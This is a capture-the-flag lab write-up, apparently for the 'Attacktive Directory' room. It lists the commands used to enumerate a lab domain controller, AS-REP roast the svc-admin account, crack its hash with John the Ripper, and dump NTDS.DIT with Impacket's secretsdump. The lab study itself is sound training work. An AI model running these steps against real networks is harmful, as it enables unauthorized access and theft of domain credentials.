# Attacktive Directory Room

- Performed nmap scan 

    `nmap -p- -A -nP 10.10.27.113`

    ![Nmap Results](2022-02-19-09-43-00.png)

- Found the DNS domain name `spookysec.local` 
- Used enum4linux to enumerate shares
  
  `enum4linux -a spookysec.local`

- Used `kerbrute` to check for valid usernames using `userlist.txt` 
  
  ```bash
  echo 10.10.27.113 spookysec.local > /etc/hosts
  kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100
  ```

  ![Kerbrute Results](2022-02-19-09-41-36.png)


## Abusing Kerberos
- Using the usernames we got from Kerbrute we are going to use Impacket's tool "GetNPUsers.py" to perform an attack method called ASREPRoasting
  
```bash
python3 ./GetNPUsers.py spookysec.local/svc-admin -no-pass 
```

![GetNPUsers.py](2022-02-20-06-52-39.png)

- Used John the Ripper to crack the hash found for `svc-admin` account 

```bash
# kerbhash.txt simply contains the discovered hash from GetNPUsers.py 
john kerbhash.txt --wordlist=./passwordlist.txt
```


![John The Ripper ](2022-02-20-07-26-11.png)


## Enumerating SMB Shares 
- used `smbclient` to find more shares 

![smbmap results](2022-02-20-07-41-07.png)

- Used credentials and `smbclient` to connect to `backup` share 

![smbclient connecting](2022-02-21-16-27-21.png)

- Then used `base64 decode <<<` to decode the string found
- Using the `backup` user credentials to dump NTDS.DIT


  ```bash
  python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc backup@spookysec.local 
  ```